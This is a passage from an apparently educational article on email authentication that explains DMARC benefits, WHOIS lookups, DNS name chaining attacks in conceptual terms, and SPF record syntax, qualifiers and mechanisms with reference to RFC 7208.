By publishing a <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> policy, you also require the domain in the <code>From</code> address
to match the <abbr title="Sender Policy Framework">SPF</abbr>-authenticated domain in the <code>MAIL</code> <code>FROM</code> address or the domain of a valid <abbr title="DomainKeys Identified Mail">DKIM</abbr> signature.
Moreover, you can specify an email address
to which receiving mail servers can send <a href="#aggregate-reports">aggregate reports</a>
so that you know how your <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> policy affects the delivery of your own messages.</li>
</ul>

<details>
  <summary id="adoption-benefits">
Adoption benefits
</summary>

  <p>At first glance, it seems as if configuring your domain with the above standards benefits mostly others.
Why should you invest some of your valuable time in your email setup just to protect others?
In economics, benefitting unrelated third parties without being compensated for it is known as a
<a href="https://en.wikipedia.org/wiki/Externality#Positive">positive externality</a>.
Treating information security as a <a href="https://en.wikipedia.org/wiki/Public_good_(economics)">public good</a>,
one might expect to see many <a href="https://en.wikipedia.org/wiki/Free-rider_problem">free riders</a>,
who benefit from improved security without contributing to it.
Fortunately, this is not what is happening with the above standards
as they benefit the people who deploy them on their domains as well:</p>
  <ul>
    <li><strong>Deliverability</strong>: Protecting your domain with <abbr title="Sender Policy Framework">SPF</abbr>, <abbr title="DomainKeys Identified Mail">DKIM</abbr>, and <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> records
makes it more difficult for others to abuse your domain for spamming and phishing.
When fewer messages coming from your domain are marked as spam,
the <a href="#reputation">reputation</a> of your domain improves,
which increases the chance that your messages reach their recipients.</li>
    <li><strong>Flexibility</strong>: By specifying which servers are authorized to deliver email on behalf of your domain,
you make it possible for others to attach reputation to your domain
rather than to the <abbr title="Internet Protocol">IP</abbr> addresses of your outgoing mail servers.
This allows you to change your servers and deploy additional ones
without losing the reputation that you’ve built so far.</li>
  </ul>

  <p>Unfortunately, these benefits apply only to the domains which you use to send emails from.
From a security perspective, however, it’s just as important to configure <abbr title="Sender Policy Framework">SPF</abbr> and <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> records on the domains
<a href="https://www.gov.uk/guidance/protect-domains-that-dont-send-email">which you don’t use to send emails from</a>.
Since the above incentives exist only for the former category of domains but not the latter,
mail server authorization is widely deployed on primary domains but less so on
<a href="https://en.wikipedia.org/wiki/URL_redirection">redirect domains</a>.</p>

</details>

<details>
  <summary id="domain-owner">
Domain owner
</summary>

  <p>Knowing with certainty that a message was sent from a specific domain is important for
algorithms such as <a href="#reputation">reputation systems</a> and <a href="#email-filtering">email filters</a>,
but domain authentication can also give human users a false sense of security, which is dangerous.
On the one hand, it can be difficult for us to tell different domain names apart,
i.e. we easily fall victim to <a href="#homograph-attack">homograph attacks</a>.
On the other hand, it can be really hard to figure out who owns the domain in question.
There are around <a href="https://en.wikipedia.org/wiki/List_of_Internet_top-level_domains">1’500 top-level domains</a>,
and you likely don’t know which top-level domain each of your contacts uses.
Do they use a <a href="https://en.wikipedia.org/wiki/Generic_top-level_domain">generic top-level domain</a>
or a <a href="https://en.wikipedia.org/wiki/Country_code_top-level_domain">country-code top-level domain</a>?
Is the <a href="https://en.wikipedia.org/wiki/Second-level_domain">second-level domain</a> only the company name
or did they have to prefix it with something because the other name was already taken?
How can you determine whether a domain indeed belongs to the company you think it belongs to?
Unfortunately, there’s no simple answer to the last question.
The easiest thing you can do is to search for the company with your favorite search engine.
If the domain in the email matches their web presence, you’re done.
If a company doesn’t use a single domain across all channels (such as myself with this blog),
the best you can do is to query the <a href="https://en.wikipedia.org/wiki/WHOIS"><abbr title="&#34;who is?&#34; (a protocol to query the owner of a domain)">WHOIS</abbr></a> database.</p>

  <p><abbr title="&#34;who is?&#34; (a protocol to query the owner of a domain)">WHOIS</abbr> is a simple protocol to query information about registered domain names.
It is specified in <a href="https://datatracker.ietf.org/doc/html/rfc3912"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 3912</a>,
and it is typically used with the <code>whois</code> command-line utility.
If you want to look up the information for <code>ef1p.com</code>,
you enter <code>whois ef1p.com</code> into your <a href="#command-line-interface">command-line interface</a>.
The <code>whois</code> utility opens a <a href="https://evalapply.org/internet/#transmission-control-protocol"><abbr title="Transmission Control Protocol">TCP</abbr></a> connection
on <a href="https://datatracker.ietf.org/doc/html/rfc3912#section-2">port 43</a> to various <abbr title="&#34;who is?&#34; (a protocol to query the owner of a domain)">WHOIS</abbr> servers.
<a href="https://en.wikipedia.org/wiki/Internet_Assigned_Numbers_Authority"><abbr title="Internet Assigned Numbers Authority">IANA</abbr></a>
maintains a root <abbr title="&#34;who is?&#34; (a protocol to query the owner of a domain)">WHOIS</abbr> server at <code>whois.iana.org</code>,
which you can query to determine the <abbr title="&#34;who is?&#34; (a protocol to query the owner of a domain)">WHOIS</abbr> server of the registry,
which in turn informs you about the <abbr title="&#34;who is?&#34; (a protocol to query the owner of a domain)">WHOIS</abbr> server of the registrar.
For example, this is how you find the <abbr title="&#34;who is?&#34; (a protocol to query the owner of a domain)">WHOIS</abbr> information of <code>ef1p.com</code>:</p>

  <figure>
    
    <figcaption>

How to perform <abbr title="&#34;who is?&#34; (a protocol to query the owner of a domain)">WHOIS</abbr> queries yourself.
Once the <abbr title="Transmission Control Protocol">TCP</abbr> connection is established, you just enter the domain name of interest followed by a new line.
(<a href="https://www.freesoft.org/CIE/RFC/1123/31.htm">Telnet should convert “return”</a>
into <a href="#newline-characters"><code>{CR}{LF}</code></a> automatically.)
As soon as the server has sent the answer, it closes the connection.

</figcaption>
  </figure>

  <p>If you perform the above steps, you’ll find that almost all information is
<a href="https://en.wikipedia.org/wiki/Domain_privacy">redacted for privacy</a>.
This practice has become the norm rather than the exception, and there is a
<a href="https://en.wikipedia.org/wiki/WHOIS#ICANN_proposal_to_abolish_WHOIS">proposal to abolish the <abbr title="&#34;who is?&#34; (a protocol to query the owner of a domain)">WHOIS</abbr> system</a>
as we know it altogether.
And even if you do get a useful answer,
the provided information might not be trustworthy
since domain registrars don’t verify their customers.</p>

  <p>You might be tempted to simply enter the domain in a web browser,
but this is dangerous because you might get infected with malware.
You also don’t learn anything by doing so:
Any website can look like the legitimate website,
and any website can <a href="https://en.wikipedia.org/wiki/URL_redirection">redirect your browser</a> to the legitimate website.
The only way to be quite certain that a domain belongs to a given company is when the connection is secured
with an <a href="https://en.wikipedia.org/wiki/Extended_Validation_Certificate">extended-validation certificate</a>
before any redirects occur.
Unfortunately, <a href="https://en.wikipedia.org/wiki/Domain-validated_certificate">domain-validated certificates</a>
are much more common nowadays, and many browsers hide the name of the owner
even if this information is present in the certificate.
In summary, you should be vigilant even if the domain looks trustworthy.</p>

</details>

<details>
  <summary id="privacy-implications">
Privacy implications
</summary>

  <p>Similar to <a href="#remote-content">remote content</a>,
domain authentication triggers requests from the receiver.
As a sender, the company which runs the name servers of your domain
might learn the domains to which you send emails.
As a recipient, the sender might learn the domains to which you forward incoming messages.
Email leaves more traces with domain authentication than without.</p>

</details>

<details>
  <summary id="name-chaining-attacks">
Name chaining attacks
</summary>

  <p><a href="#remote-content">Remote content</a> and <a href="#domain-authentication">domain authentication</a>
allow an attacker to trigger <abbr title="Domain Name System">DNS</abbr> lookups to their <a href="https://en.wikipedia.org/wiki/Name_server">name server</a>.
If the <abbr title="Domain Name System">DNS</abbr> resolver of the victim isn’t careful in how it processes the response,
the attacker can <a href="https://en.wikipedia.org/wiki/DNS_spoofing">poison its cache</a>.
If successful, completely unrelated requests from the victim go to the attacker instead of the intended recipient.
For example, the attacker could reply to a query for the <code>A</code> record of <code>subdomain.attacker.example</code>
with a <code>CNAME</code> record pointing to <code>target.example</code> and tell the victim’s <abbr title="Domain Name System">DNS</abbr> resolver
in the so-called additional section of the response that
the <code>A</code> record of <code>target.example</code> has the attacker’s <abbr title="Internet Protocol">IP</abbr> address as its value.
The attacker could also redirect the victim’s <abbr title="Domain Name System">DNS</abbr> resolver to the name server of <code>target.example</code>
and provide their own <abbr title="Internet Protocol">IP</abbr> address
<a href="https://en.wikipedia.org/wiki/DNS_spoofing#Redirect_the_target_domain&#39;s_name_server">as the name server’s address</a>
in the additional section of the response.
This is known as a <a href="https://datatracker.ietf.org/doc/html/rfc3833#section-2.3">name chaining attack</a>.
In the absence of <a href="https://evalapply.org/internet/#domain-name-system-security-extensions"><abbr title="Domain Name System Security Extensions">DNSSEC</abbr></a>,
any records in the additional section may not be cached by <abbr title="Domain Name System">DNS</abbr> resolvers.
(In case you are wondering, <a href="https://en.wikipedia.org/wiki/.example"><code>.example</code></a>
is a top-level domain reserved for examples.)</p>

</details>

<h4 id="sender-policy-framework">Sender Policy Framework (<abbr title="Sender Policy Framework">SPF</abbr>)</h4>

<p>The <a href="https://en.wikipedia.org/wiki/Sender_Policy_Framework">Sender Policy Framework (<abbr title="Sender Policy Framework">SPF</abbr>)</a>
is specified in <a href="https://datatracker.ietf.org/doc/html/rfc7208"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7208</a>.
As a domain owner, you list the <abbr title="Internet Protocol">IP</abbr> addresses of your outgoing mail servers in a <code>TXT</code> record at your domain.
Incoming mail servers then check whether the <abbr title="Internet Protocol">IP</abbr> address of the sending mail server is included
in the <abbr title="Sender Policy Framework">SPF</abbr> record of the domain which was used in the <code>MAIL</code> <code>FROM</code> command.
If this is not the case, incoming mail servers can reject the message
during the <a href="#simple-mail-transfer-protocol"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr> session</a>.
<a href="https://datatracker.ietf.org/doc/html/rfc7372#section-3.2"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7372</a> defines
<a href="#common-smtp-extensions">enhanced status codes</a>
with which the server can indicate failed <abbr title="Sender Policy Framework">SPF</abbr> validation.
Since <a href="https://evalapply.org/internet/#ip-address-spoofing"><abbr title="Internet Protocol">IP</abbr> addresses cannot be spoofed</a>
without access to the target’s local network,
this procedure authenticates the sender’s domain.</p>

<p>So how do you create the <abbr title="Sender Policy Framework">SPF</abbr> record for your domain?
If you don’t run your mail servers yourself,
your <abbr title="Sender Policy Framework">SPF</abbr> record will consist of:</p>
<ul>
  <li><a href="https://datatracker.ietf.org/doc/html/rfc7208#section-4.5"><strong>Version</strong></a>:
Every <abbr title="Sender Policy Framework">SPF</abbr> record has to start with <code>v=spf1</code>.</li>
  <li><a href="https://datatracker.ietf.org/doc/html/rfc7208#section-5.2"><strong>Includes</strong></a>:
An <abbr title="Sender Policy Framework">SPF</abbr> record can include the <abbr title="Internet Protocol">IP</abbr> addresses of another <abbr title="Sender Policy Framework">SPF</abbr> record.
Search for the appropriate record from your mailbox provider.
For example, put <code>include:_spf.google.com</code> (<a href="https://support.google.com/a/answer/33786">source</a>)
into your <abbr title="Sender Policy Framework">SPF</abbr> record if you use <a href="https://workspace.google.com/products/gmail/">Google Workspace</a>.
Since mailing list providers, such as <a href="https://mailchimp.com/">Mailchimp</a>,
use an address of their own in the <code>MAIL</code> <code>FROM</code> command
so that they can handle <a href="#bounce-messages">bounce messages</a> for you,
you don’t need to add the addresses of their servers to your <abbr title="Sender Policy Framework">SPF</abbr> record.</li>
  <li><a href="https://datatracker.ietf.org/doc/html/rfc7208#section-5.1"><strong>Default</strong></a>:
Provide an explicit default result for any sender
which didn’t match one of the previous <a href="#spf-mechanisms">mechanisms</a>.
If you want incoming mail servers to reject messages with a spoofed <code>MAIL</code> <code>FROM</code> domain, use <code>-all</code>.
If you want incoming mail servers to just flag such messages as potentially fraudulent, use <code>~all</code>.
In order not to disrupt <a href="#email-forwarding">email forwarding</a>,
incoming mail servers are unlikely to enforce your <abbr title="Sender Policy Framework">SPF</abbr> policy.
They are much more likely to enforce the domain policy of your
<a href="#domain-based-message-authentication-reporting-and-conformance"><abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> record</a>.</li>
</ul>

<p>An <abbr title="Sender Policy Framework">SPF</abbr> record created according to the above steps looks as follows: <code>v=spf1 include:_spf.google.com -all</code>.
On domains from which you don’t send any emails,
you <a href="https://datatracker.ietf.org/doc/html/rfc7208#section-10.1.2">should use</a> <code>v=spf1 -all</code>.
The full syntax of <abbr title="Sender Policy Framework">SPF</abbr> records is much more powerful than this but rarely needed.
I will cover <abbr title="Sender Policy Framework">SPF</abbr> in more detail in the <a href="#spf-qualifiers">boxes below</a>.
There are <a href="#tool-lookup-spf-record&amp;domain=bad.spf.ef1p.com" title="Look up the SPF record of bad.spf.ef1p.com, which has lots of issues.">a lot of things</a>
that can go wrong when configuring an <abbr title="Sender Policy Framework">SPF</abbr> record.
For a start, a domain may have <a href="https://datatracker.ietf.org/doc/html/rfc7208#section-3.2">at most one <abbr title="Sender Policy Framework">SPF</abbr> record</a>
and the number of additional <abbr title="Domain Name System">DNS</abbr> lookups an <abbr title="Sender Policy Framework">SPF</abbr> record may trigger
is <a href="https://datatracker.ietf.org/doc/html/rfc7208#section-4.6.4">limited</a>.
Instead of listing all the pitfalls here, I’ve built a tool
which performs 30 different checks on your <abbr title="Sender Policy Framework">SPF</abbr> record.
It uses <a href="https://developers.google.com/speed/public-dns/docs/doh/json">Google’s <abbr title="Domain Name System">DNS</abbr> <abbr title="Application Programming Interface">API</abbr></a> to query the records.
Please note that this tool warns you only about common mistakes,
it doesn’t verify whether your outgoing mail servers are included in the record.
You still have to test your setup by sending emails
and checking the <a href="#spf-received-header-field"><code>Received-SPF</code> header field</a>.
By not evaluating whether an <abbr title="Internet Protocol">IP</abbr> address passes <abbr title="Sender Policy Framework">SPF</abbr> validation,
the tool is also limited in <a href="#spf-macros">other regards</a>.</p>



<details>
  

  <p>Since <abbr title="Domain Name System">DNS</abbr> records can change over time and the <abbr title="Sender Policy Framework">SPF</abbr> check has to succeed only at the point of delivery,
incoming mail servers should record the result of their <abbr title="Sender Policy Framework">SPF</abbr> evaluation in the header of accepted messages.
This allows mail filters and mail clients to process and display messages differently
depending on whether the domain of the sender was successfully authenticated.
There are two fields for this purpose: <a href="https://datatracker.ietf.org/doc/html/rfc7208#section-9.1"><code>Received-SPF</code></a>
and <a href="#authentication-results-header-field"><code>Authentication-Results</code></a>, which we’ll discuss later.
Both of them are <a href="#trace-information">trace fields</a>,
which means that they should be added at the top of the header
and that they must appear above all fields with the same name.
The format of the <code>Received-SPF</code> header field is as follows:</p>

  <figure>

    <div><div><pre><code>Received-SPF: {Result} ({Comment})[ {Key}={Value};]*
</code></pre></div>    </div>

    <figcaption>

The format of the <code>Received-SPF</code> as specified in <a href="https://datatracker.ietf.org/doc/html/rfc7208#section-9.1"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7208</a>.
The curly brackets need to be replaced with actual values.
The content in square brackets is optional and
the asterisk indicates that the preceding content can be repeated.

</figcaption>
  </figure>

  <p>The possible <a href="https://datatracker.ietf.org/doc/html/rfc7208#section-2.6">results of <abbr title="Sender Policy Framework">SPF</abbr> evaluation</a> are
<code>pass</code>, <code>fail</code>, <code>softfail</code>, <code>neutral</code>, <code>none</code>, <code>temperror</code>, and <code>permerror</code>.
The first four values are the result of a successful evaluation
(see the <a href="#spf-qualifiers">qualifiers</a> and <a href="#spf-mechanisms">mechanisms</a> for more information),
<code>none</code> means that the sender used a syntactically invalid domain or that no <abbr title="Sender Policy Framework">SPF</abbr> record was found,
<code>temperror</code> means that a temporary error occurred and that a later retry might be successful,
and <code>permerror</code> means that the error is permanent and needs to be resolved by the publisher of the <abbr title="Sender Policy Framework">SPF</abbr> record.
The <code>Comment</code> and the <code>Key</code>-<code>Value</code> pairs are recommended but optional.
Typical keys can be taken from the example below:</p>

  <figure>

    <div><div><pre><code>Received-SPF: pass (example.org: domain of example.com designates 192.0.2.1 as permitted sender)
  client-ip=192.0.2.1; envelope-from=&#34;sender@example.com&#34;; helo=server.example.com;
</code></pre></div>    </div>

    <figcaption>

An example <code>Received-SPF</code> header field. The values are intended to make the result verifiable.

</figcaption>
  </figure>

</details>

<details>
  <summary id="protecting-subdomains">
Protecting subdomains
</summary>

  <p>Incoming mail servers query only the domain of the <code>MAIL</code> <code>FROM</code> address
(or the <a href="#helo-identity"><code>HELO</code> identity</a> as a fallback) for an <abbr title="Sender Policy Framework">SPF</abbr> record.
If <code>support.example.com</code> doesn’t have an <abbr title="Sender Policy Framework">SPF</abbr> record,
<abbr title="Sender Policy Framework">SPF</abbr> verifiers won’t continue the lookup with <code>example.com</code>.
Does this mean that you should configure an <abbr title="Sender Policy Framework">SPF</abbr> record for all your subdomains?
If you use a subdomain to send emails from, then the answer is yes.
If you don’t use the subdomain for outgoing emails, the answer is more complicated.
If the subdomain has an <code>MX</code> record to receive incoming emails,
you should consider adding an <code>v=spf1 -all</code> record.
Since many mail servers check whether the sender’s domain has a valid <code>MX</code> record,
configuring an <abbr title="Sender Policy Framework">SPF</abbr> record on subdomains without an <code>MX</code> record is usually not necessary.
For unused domains, setting up a <a href="#domain-based-message-authentication-reporting-and-conformance"><abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> record</a>
is much more important.
On the one hand, <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> protects the identity which is actually visible to users: the <code>From</code> address.
On the other hand, <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> policies also cover subdomains,
where the <a href="#subdomain-policy">policy for subdomains</a>
can be different from the policy for the <a href="#organizational-domain">organizational domain</a>.
If you configure a <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> record for unused domains,
an <abbr title="Sender Policy Framework">SPF</abbr> record is necessary only for mail servers which verify <abbr title="Sender Policy Framework">SPF</abbr> but don’t support <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr>.
Given that <abbr title="Sender Policy Framework">SPF</abbr> was introduced in <a href="https://datatracker.ietf.org/doc/html/rfc4408">2006</a>
and <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> in <a href="https://datatracker.ietf.org/doc/html/rfc7489">2015</a>,
such servers exist and won’t vanish anytime soon.</p>

  <p>Subdomains pose another interesting question:
Are <abbr title="Sender Policy Framework">SPF</abbr> verifiers supposed to follow <a href="https://en.wikipedia.org/wiki/CNAME_record"><code>CNAME</code> records</a>?
If the answer is yes and an additional <abbr title="Domain Name System">DNS</abbr> query is necessary,
does this count towards the <a href="https://datatracker.ietf.org/doc/html/rfc7208#section-4.6.4">lookup limit</a>?
Unfortunately, <a href="https://www.rfc-editor.org/errata/eid6432">the standard is silent on this</a>.
The above tool does resolve <code>CNAME</code> records but doesn’t count them.
In the absence of an authoritative answer,
I advise against using <code>CNAME</code> records.
If <abbr title="Sender Policy Framework">SPF</abbr> verifiers are supposed to follow <code>CNAME</code> records,
then any <code>CNAME</code> record which points to another <a href="https://en.wikipedia.org/wiki/DNS_zone"><abbr title="Domain Name System">DNS</abbr> zone</a>
is also a security risk because the owner of that zone can configure an <abbr title="Sender Policy Framework">SPF</abbr> record
and send emails on behalf of your subdomain.</p>

</details>

<details>
  <summary id="email-forwarding">
Email forwarding
</summary>

  <p>Historically, emails to <a href="#alias-address">alias addresses</a> were forwarded without changing the <code>MAIL</code> <code>FROM</code> address,
which had the advantage that <a href="#bounce-messages">bounce messages</a> were sent directly back to the original sender.
Nowadays, forwarding emails without changing the <code>MAIL</code> <code>FROM</code> address breaks <abbr title="Sender Policy Framework">SPF</abbr> validation.
The incoming mail server of the final recipient might reject the message
because the forwarding mail server isn’t authorized to send messages on behalf of the sender’s domain.
In order to avoid this, forwarding mail servers have to use a
<a href="https://en.wikipedia.org/wiki/Sender_Rewriting_Scheme">sender rewriting scheme</a>,
which makes use of <a href="#bounce-messages">variable envelope return paths (<abbr title="Variable Envelope Return Path">VERP</abbr>)</a>.
The idea is to encode the original <code>MAIL</code> <code>FROM</code> address in a new <code>MAIL</code> <code>FROM</code> address
so that bounce messages coming back to this address can be forwarded to the original sender.
In order not to forward spam to the original sender,
the forwarding mail server should use <a href="#backscatter">bounce address tag validation (<abbr title="Bounce Address Tag Validation">BATV</abbr>)</a>.
In practice, most mail servers also accept emails with failed <abbr title="Sender Policy Framework">SPF</abbr> checks
if the <a href="#reputation">reputation of the forwarder</a> is high enough.
As a consequence, forwarding usually works even without rewriting the <code>MAIL</code> <code>FROM</code> address,
which defeats the purpose of <abbr title="Sender Policy Framework">SPF</abbr> to some degree.
<a href="https://datatracker.ietf.org/doc/html/rfc7208#appendix-D"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7208</a>
also discusses some other solutions to the forwarding problem.</p>

</details>

<details>
  <summary id="spf-qualifiers">
<abbr title="Sender Policy Framework">SPF</abbr> qualifiers
</summary>

  <p><abbr title="Sender Policy Framework">SPF</abbr> records are structured according to the following syntax
as specified in <a href="https://datatracker.ietf.org/doc/html/rfc7208#section-12"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7208</a>:</p>

  <figure>

    <div><div><pre><code>v=spf1[ [{Qualifier}]{Mechanism}]*[ {Modifier}]*
</code></pre></div>    </div>

    <figcaption>

The curly brackets need to be replaced with a <a href="#spf-qualifiers">qualifier</a>,
a <a href="#spf-mechanisms">mechanism</a> or a <a href="#spf-modifiers">modifier</a>.
The content in square brackets is optional.
The asterisk indicates that the preceding content can be repeated.

</figcaption>
  </figure>

  <p><abbr title="Sender Policy Framework">SPF</abbr> records are evaluated <a href="https://datatracker.ietf.org/doc/html/rfc7208#section-4.6.2">from left to right</a>.
The qualifier of the first mechanism which matches the sender’s <abbr title="Internet Protocol">IP</abbr> address determines the result of the evaluation.
If no mechanism matches, the <a href="https://datatracker.ietf.org/doc/html/rfc7208#section-4.7">default result</a> is <code>neutral</code>.
The four qualifiers are:</p>

  <figure>

    <table>
      <thead>
        <tr>
          <th>Qualifier</th>
          <th>Result</th>
          <th>Description</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td><code>+</code></td>
          <td><code>pass</code></td>
          <td>The sender is authorized to send messages on behalf of the given domain.</td>
        </tr>
        <tr>
          <td><code>-</code></td>
          <td><code>fail</code></td>
          <td>The sender is not authorized to send messages on behalf of the given domain.</td>
        </tr>
        <tr>
          <td><code>?</code></td>
          <td><code>neutral</code></td>
          <td>The domain owner makes no assertion. This result has to be treated like <a href="#spf-received-header-field"><code>none</code></a>.</td>
        </tr>
        <tr>
          <td><code>~</code></td>
          <td><code>softfail</code></td>
          <td>Between <code>fail</code> and <code>neutral</code>. The message can be flagged but not rejected.</td>
        </tr>
      </tbody>
    </table>

    <figcaption>

The four qualifiers and the evaluation results to which they lead.

</figcaption>
  </figure>

  <p>Mechanisms without a qualifier default to <code>+</code>.
How the various results are to be handled is discussed in
<a href="https://datatracker.ietf.org/doc/html/rfc7208#section-8">section 8 of <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7208</a>.</p>

</details>

<details>
  <summary id="spf-mechanisms">
<abbr title="Sender Policy Framework">SPF</abbr> mechanisms
</summary>

  <p><a href="https://datatracker.ietf.org/doc/html/rfc7208#section-5"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7208</a> defines eight mechanisms
to match the sender’s <abbr title="Internet Protocol">IP</abbr> address:</p>
  <ul>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc7208#section-5.1"><code>all</code></a> matches all <abbr title="Internet Protocol">IP</abbr> addresses.
It is used to provide an explicit default result as the rightmost mechanism.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc7208#section-5.6"><code>ip4</code> and <code>ip6</code></a>
produce a match if the sender’s <abbr title="Internet Protocol">IP</abbr> address is in the network specified after a colon.
The network is written in the <a href="https://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing#CIDR_notation">classless inter-domain routing (<abbr title="Classless Inter-Domain Routing">CIDR</abbr>) notation</a>:
An <abbr title="Internet Protocol">IP</abbr> address followed by the number of bits that need to match.
For example, <code>ip4:192.0.2.0/24</code> matches all <abbr title="Internet Protocol">IP</abbr> addresses from <code>192.0.2.0</code> to <code>192.0.2.255</code>.
When specifying a single address, <code>/32</code> doesn’t have to be appended to the address.
The number in <code>ip4</code> and <code>ip6</code> refer to the version of the <a href="https://evalapply.org/internet/#network-layer">Internet Protocol</a>.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc7208#section-5.3"><code>a</code></a>
matches if the domain has an <code>A</code> or <code>AAAA</code> record which matches the sender’s <abbr title="Internet Protocol">IP</abbr> address.
When used without an argument, the lookup is performed on the domain of the <abbr title="Sender Policy Framework">SPF</abbr> record.
At the beginning of the <abbr title="Sender Policy Framework">SPF</abbr> check, this is the domain of the <code>MAIL</code> <code>FROM</code> address.
When additional lookups are triggered, the domain of the current lookup is used.
Instead of using the current domain for the record lookup,
a different domain can be provided after a colon.
For example, <code>a:example.com</code> matches if the sender’s <abbr title="Internet Protocol">IP</abbr> address
is among the <code>A</code> or <code>AAAA</code> records of <code>example.com</code>.
The address range can be extended with a <abbr title="Classless Inter-Domain Routing">CIDR</abbr> suffix.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc7208#section-5.4"><code>mx</code></a>
matches if the sender’s <abbr title="Internet Protocol">IP</abbr> address belongs to one of the mail exchange (<abbr title="Mail eXchange">MX</abbr>) hosts of the domain.
Since <code>MX</code> records contain a domain name and not an <abbr title="Internet Protocol">IP</abbr> address,
an additional lookup is required for each returned <code>MX</code> record.
These lookups count towards the <a href="https://datatracker.ietf.org/doc/html/rfc7208#section-4.6.4">limit of 10 <abbr title="Domain Name System">DNS</abbr> queries</a>
after the initial record retrieval.
Therefore, use the <code>mx</code> mechanism only if absolutely necessary.
A different domain can be specified after a colon,
and the address range can be extended with a <abbr title="Classless Inter-Domain Routing">CIDR</abbr> suffix.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc7208#section-5.2"><code>include</code></a>
matches if the evaluation of the referenced <abbr title="Sender Policy Framework">SPF</abbr> record results in a <code>pass</code> for the sender’s <abbr title="Internet Protocol">IP</abbr> address.
This is the most confusing of all mechanisms because the referenced <abbr title="Sender Policy Framework">SPF</abbr> record is not actually included.
If the evaluation of the referenced <abbr title="Sender Policy Framework">SPF</abbr> record results in a <code>pass</code>,
the <a href="#spf-qualifiers">qualifier</a> in front of the <code>include</code> mechanism determines the result of the evaluation.
Mechanisms with a <code>-</code>, <code>?</code>, or <code>~</code> in front of them have no effect in the referenced <abbr title="Sender Policy Framework">SPF</abbr> record
unless they prevent a later mechanism from producing a <code>pass</code> result.
For example, if the <abbr title="Sender Policy Framework">SPF</abbr> record of <code>example.com</code> contains <code>-include:example.net</code>
and the <abbr title="Sender Policy Framework">SPF</abbr> record at <code>example.net</code> is <code>v=spf1 -a ip4:192.0.2.1 -all</code>,
the <code>-a</code> matters only if it produces a fail for the <abbr title="Internet Protocol">IP</abbr> address <code>192.0.2.1</code>.
If this is not the case and the sender’s <abbr title="Internet Protocol">IP</abbr> address is <code>192.0.2.1</code>,
the evaluation of the referenced <abbr title="Sender Policy Framework">SPF</abbr> record results in a <code>pass</code>.
This causes the <code>include</code> mechanism of <code>example.com</code> to match
and since the qualifier of the <code>include</code> mechanism is <code>-</code>,
the evaluation of <code>example.com</code>’s <abbr title="Sender Policy Framework">SPF</abbr> record results in a <code>fail</code>.
Records with such exclusions are quite rare, but being able to exclude some addresses before authorizing
other addresses can be useful when a range of <abbr title="Internet Protocol">IP</abbr> addresses shall be authorized with a few exceptions.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc7208#section-5.7"><code>exists</code></a>
matches if the domain name provided after the colon has an <code>A</code> record.
This is useful only in combination with <a href="#spf-macros">macros</a>, where parts of the provided domain name
can be replaced with the local part of the <code>MAIL</code> <code>FROM</code> address or the sender’s <abbr title="Internet Protocol">IP</abbr> address.
This makes it possible to produce different results for different users of the same mail server.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc7208#section-5.5"><code>ptr</code></a>
matches if the <a href="#reverse-dns-entry">reverse <abbr title="Domain Name System">DNS</abbr> entry</a> of the sender’s <abbr title="Internet Protocol">IP</abbr> address
returns a subdomain of the target domain.
The target domain can be provided after a colon similar to the <code>a</code> and <code>mx</code> mechanisms.
If no such domain is provided, the target domain is the current domain of the <abbr title="Sender Policy Framework">SPF</abbr> evaluation.
Since the sender controls the reverse <abbr title="Domain Name System">DNS</abbr> entries of its <abbr title="Internet Protocol">IP</abbr> address,
the returned domain name has to include the sender’s <abbr title="Internet Protocol">IP</abbr> address in one of its <code>A</code> or <code>AAAA</code> records.
This is known as <a href="https://en.wikipedia.org/wiki/Forward-confirmed_reverse_DNS">forward-confirmed reverse <abbr title="Domain Name System">DNS</abbr></a>.
According to <a href="https://datatracker.ietf.org/doc/html/rfc7208#section-5.5"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7208</a>,
the <code>ptr</code> mechanism should no longer be used because it is slow
and places a large burden on the <code>.arpa</code> <abbr title="Domain Name System">DNS</abbr> servers.
As an <a href="https://www.rfc-editor.org/errata/eid5228">errata points out</a>,
both arguments are questionable since most mail servers do a reverse lookup anyway
to record the sender’s identity in the <a href="#trace-information"><code>Received</code> header field</a>.</li>
  </ul>

  <p><a href="https://datatracker.ietf.org/doc/html/rfc7208#section-4.6.1">Mechanisms and modifiers are case-insensitive</a>.
Instead of including examples here, you can query real <abbr title="Sender Policy Framework">SPF</abbr> records with the <a href="#tool-lookup-spf-record">above tool</a>.
If your <abbr title="Sender Policy Framework">SPF</abbr> record triggers more than 10 lookups,
you have to inline some of your <code>a</code> or <code>mx</code> mechanisms.
Before you inline an <code>include</code> mechanism, make sure that you fully understand how they work.
